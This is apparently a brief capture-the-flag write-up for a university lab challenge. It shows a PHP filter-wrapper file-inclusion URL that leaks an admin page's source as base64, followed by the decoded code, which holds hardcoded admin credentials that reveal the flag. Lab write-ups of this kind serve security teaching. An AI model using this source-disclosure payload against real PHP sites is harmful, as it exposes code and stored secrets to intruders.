visit: https://meow.ctfd.nckuctf.org/?page=php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dadmin

copy the content in the page and decode it by base64 decode

get:

```php
<h1>Admin Panel</h1>
<form>
    <input type="text" name="username" value="admin">
    <input type="password" name="password">
    <input type="submit" value="Submit">
</form>

<?php
$admin_account = array("username" => "admin", "password" => "lab_password");
if (
    isset($_GET['username']) && isset($_GET['password']) &&
    $_GET['username'] === $admin_account['username'] && $_GET['password'] === $admin_account['password']
) {
    echo "<h1>LOGIN SUCCESS!</h1><p>".getenv('FLAG')."</p>";
}

?>
```
